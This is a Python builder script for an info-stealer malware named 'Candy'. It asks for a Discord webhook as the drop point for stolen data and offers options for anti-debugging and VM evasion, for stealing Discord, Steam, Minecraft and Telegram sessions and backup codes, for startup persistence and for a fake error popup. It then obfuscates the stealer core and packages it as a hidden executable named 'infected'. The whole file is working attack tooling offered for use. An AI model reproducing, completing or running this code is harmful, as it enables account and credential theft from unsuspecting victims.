import re
import os
import subprocess
import requests
import getpass
import sys
import pyfiglet
import zipfile
import tempfile
from InquirerPy import prompt
from colorama import init
from plyer import notification
from rich.console import Console
import logging
from rich.logging import RichHandler

from utils.Obfuscators import Obfuscators

init(autoreset=True)
os.system("cls")
obf = Obfuscators(include_imports=True, recursion=2)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)

version = "1.56.6"
CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR", "Telegram"]
ENABLE_KEYS = ["Anti Debug / VM", "Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR", "Telegram Session Steal"]
PATH = "src/stealer_core/src.py"

console = Console()

Candy = pyfiglet.figlet_format("Candy", font="graffiti")
console.print(Candy,
              justify="center",
              highlight=True,
              style="magenta",
              overflow="ignore")

username = getpass.getuser()


def ask_inputs():
    style = {
        "questionmark": "#ff9d00 bold",
        "selected": "#927ba6",
        "instruction": "",
        "answer": "#927ba6 bold",
        "question": "",
    }

    questions = [
        {
            "type": "input",
            "name": "webhook",
            "message": "Enter your Discord Webhook URL:",
            "validate": (lambda x: False if re.match(r"https://(canary.|ptb.)?(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
        },
    ]

    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
        questions.append({
            "type": "confirm",
            "name": key,
            "message": f"Enable {label}?",
            "default": False,
        })

    answers = prompt(questions=questions, style=style)
    webhook = answers.pop("webhook")
    return webhook, answers

def update_config_in_file(filepath, updated_config, webhook_url=None):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        logging.error(f"[File Read Error] {filepath}: {e}")
        return  

    try:
        for key, value in updated_config.items():
            content = re.sub(rf'"{key}":\s*(True|False)', f'"{key}": {value}', content)

        if webhook_url:
            content = re.sub(r'"webhook":\s*"[^"]*"', f'"webhook": \"{webhook_url}\"', content)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)

        if version.endswith("-dev"):
            logging.debug("\n[DEV MODE] Full content preview:")
            logging.debug(f"{content}")

    except Exception as e:
        logging.error(f"[Update Error] Config update failed for {filepath}: {e}")
        sys.exit(1)

def build():
    pyinstaller = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.13.1.zip"

    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "pyinstaller.zip")
            r = requests.get(pyinstaller, stream=True)
            r.raise_for_status()
            with open(zip_path, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(tmpdir)

            extracted_folder = None
            for name in os.listdir(tmpdir):
                if name.startswith("pyinstaller-"):
                    extracted_folder = os.path.join(tmpdir, name)
                    break

            if not extracted_folder:
                raise FileNotFoundError("Extracted PyInstaller folder not found.")

            subprocess.run([sys.executable, "-m", "pip", "install", extracted_folder], check=True)
            logging.debug("PyInstaller installed successfully from GitHub release.")

    except Exception as e:
        logging.error(f"Failed to install PyInstaller from GitHub release: {e}")
        logging.debug("Falling back to PyPI installation...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)

    subprocess.run(["pyinstaller", "--version"], shell=True)
    subprocess.run(["pyinstaller", "--help"], shell=True)
    logging.debug("Started Build with Pyinstaller")

    subprocess.run([
        "pyinstaller", "--onefile", "--clean", "--noconsole",
        "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
        PATH
    ], shell=True)

def main():
    webhook, config = ask_inputs()
    update_config_in_file(PATH, config, webhook)
    obf.execute(PATH)
    build()

if __name__ == "__main__":    
    main()
